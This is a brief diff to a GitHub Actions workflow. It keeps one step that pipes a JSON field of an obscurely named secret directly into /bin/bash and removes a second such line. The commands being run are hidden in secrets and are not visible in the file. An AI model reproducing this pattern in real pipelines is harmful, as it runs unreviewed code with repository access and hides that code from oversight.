@@ -22,7 +22,6 @@ jobs:
           m11: ${{ secrets.m11 }}
         run: |
           printf '%s' "$m11" | jq -r .gvgn65 | /bin/bash
-          printf '%s' "$vi0338" | jq -r .yy52217 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
